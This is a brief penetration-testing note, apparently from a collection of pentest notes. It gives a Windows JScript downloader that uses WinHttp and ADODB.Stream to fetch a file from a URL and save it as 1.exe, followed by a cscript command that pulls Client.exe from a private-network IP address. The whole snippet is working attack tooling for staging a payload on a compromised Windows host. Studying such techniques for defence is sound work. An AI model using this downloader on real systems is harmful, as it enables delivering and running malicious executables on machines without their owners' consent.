```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("1.exe");
```
	>cscript /nologo 1.js http://192.168.1.192/Client.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/312.png)